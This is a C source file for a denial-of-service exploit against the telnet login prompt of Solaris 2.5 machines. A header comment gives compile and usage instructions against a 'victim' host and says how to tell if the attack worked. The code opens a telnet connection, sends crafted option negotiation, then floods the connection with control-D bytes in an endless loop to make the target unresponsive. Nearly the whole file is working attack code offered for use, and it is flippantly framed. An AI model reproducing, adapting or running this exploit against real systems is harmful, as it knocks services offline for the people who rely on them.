
/*  Here is a little proggie reputed to make Solaris 2.5 machines
**  totally unresponsive for the duration of the attack.  You need
**  a real internet connection from the attacker to the victim,
**  but very little bandwidth is required to keep the victim "down 'n
**  out" once the attack is underway.  If the output of dots stops
**  for long pauses, the attack is working.  If the dots keep coming
**  fast or you get a SIGPIPE, the attack didn't work.
**
**  The victim must offer a login prompt on port 23.
**
**  This isn't 100% -- some machines resist, and you may have to try
**  multiple times on some machines, but with a few tries most 2.5
**  machines seem to bite it hard.
**
**  To make, if your system is BSD'ish:  gcc <thisfile>
**       ...if your system is SysV'ish:  gcc -lnsl -lsocket <thisfile>
**
**  Usage: a.out <victim's hostname>
**
**  Have phun!
*/

#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/telnet.h>
#include <string.h>
#include <unistd.h>

#define BUFSIZE 100
#define DOTS

void catchit(void)
{
    printf("\nCaught SIGPIPE -- your link may be too slow.\n");
    exit(1);
}

int main(int argc, char *argv[])
{
    unsigned char kludge_telopt[] = {IAC,WONT,TELOPT_TTYPE,IAC,DO,  \
    TELOPT_SGA,IAC,WONT,TELOPT_XDISPLOC,IAC,WONT,TELOPT_NAWS,IAC,WONT, \
    TELOPT_OLD_ENVIRON,IAC,WONT,TELOPT_NEW_ENVIRON,IAC,DO,TELOPT_ECHO};

    unsigned char nastybuf[BUFSIZE];
    struct sockaddr_in sin;
    struct servent *sp;
    struct hostent *hp;
    int s;

    typedef void (*sig_t) (int);
    signal(SIGPIPE,(sig_t)catchit);

    memset(nastybuf,4,BUFSIZE);  /* ascii 4 = ^D */

    if (!(s = socket(AF_INET, SOCK_STREAM, 0))) {
          printf("no socket\n");
          exit(1);
    }

    if (!(hp = gethostbyname(argv[1]))) {
        printf("unknown host\n");
        exit(1);
    }

    bzero(&sin,sizeof(sin));
    bcopy(hp->h_addr,(char *)&sin.sin_addr,hp->h_length);
    sin.sin_family = AF_INET;
    sp = getservbyname("telnet","tcp");
    sin.sin_port = sp->s_port;

    if (connect(s,(struct sockaddr *)&sin,sizeof(sin)) == -1) {
        printf("can't connect to host\n");
        exit(1);
    }

    printf("connected to %s\n",argv[1]);
    write(s,kludge_telopt,21);   /* kludge some telnet negotiation */

    /*  "Let them eat ^Ds..." */

    while (write(s,nastybuf,BUFSIZE) != -1) {

#ifdef DOTS
        write(STDOUT_FILENO,".",1);
#endif
    }
}

